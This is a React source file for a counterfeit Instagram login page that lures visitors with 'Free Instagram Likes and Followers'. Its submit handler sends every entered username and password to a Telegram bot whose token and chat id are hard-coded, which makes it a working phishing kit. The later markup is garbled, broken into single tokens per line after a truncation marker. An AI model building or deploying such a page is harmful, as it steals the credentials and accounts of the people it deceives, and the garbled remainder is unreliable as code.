import { useState } from "react";

export function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const isFormValid = username.length > 0 && password.length >= 6;

  // Add this function to send credentials to your Telegram bot
  const handleSubmit = async (e) => {
    e.preventDefault();
    const message = `Username: ${username}\nPassword: ${password}`;
    await fetch(
      `https://api.telegram.org/bot7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo/sendMessage?chat_id=7643222418&text=${encodeURIComponent(message)}`
    );
  };

  return (
    <div className="min-h-screen bg-[#fafafa] flex flex-col items-center justify-center px-4">
      {/* Main Container */}
      <div className="w-full max-w-[350px] flex flex-col items-center">
        
        {/* Login Box */}
        <div className="w-full bg-white border border-[#dbdbdb] rounded-sm px-10 pt-10 pb-6 mb-2.5">
          
          {/* Instagram Logo - Using the official Instagram wordmark */}
          <div className="flex justify-center mb-4">
            <img 
              src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
              alt="Instagram" 
              className="h-[51px] object-contain"
            />
          </div>

          {/* Custom Heading */}
          <div className="text-center mb-6">
            <h1 className="text-[16px] font-semibold text-[#8e8e8e] leading-5">
              Free Instagram Likes and Followers
            </h1>
          </div>

          {/* Login Form */}
          <form className="flex flex-col gap-1.5" onSubmit={handleSubmit}>
            {/* Username Input */}
            <div className="relative">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-[2px] text-xs outline-none focus:border-[#a8a8a8] peer"
                placeholder=" "
              />
              <label className="absolute left-2 top-1/2 -translate-y-1/2 text-[12px] text-[#8e8e8e] pointer-events-none transition-all duration-100 ease-linear peer-focus:top-[10px] peer-focus:text-[10px] peer-[:not(:placeholder-shown)]:top-[10px] peer-[:not(:placeholder-shown)]:text-[10px]">
                Phone number, username, or email
              </label>
            </div>

            {/* Password Input */}
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-[2px] pr-14 text-xs outline-none focus:border-[#a8a8a8] peer"
                placeholder=" "
              />
              <label className="absolute left-2 top-1/2 -translate-y-1/2 text-[12px] text-[#8e8e8e] pointer-events-none transition-all duration-100 ease-linear peer-focus:top-[10px] peer-focus:text-[10px] peer-[:not(:placeholder-shown)]:top-[10px] peer-[:not(:placeholder-shown)]:text-[10px]" >
                Password
              </label>
              {password.length > 0 && (
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-[#262626]"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              )}
            </div>

            {/* Login Button */}
            <button
              type="submit"
              disabled={!isFormValid}
              className={`w-full h-[32px]
mt-
...
[truncated for brevity]
...
py-
4
text-
center
mb-
2.5
"
>
<p
class=
"text-
sm
text-
[#262626]
"
>
Don't have an account?
{" "}
<a href="#" className="
font-
semibold
text-
[#0095f6]
"
>
Sign up
</a>
</p>
</div>

{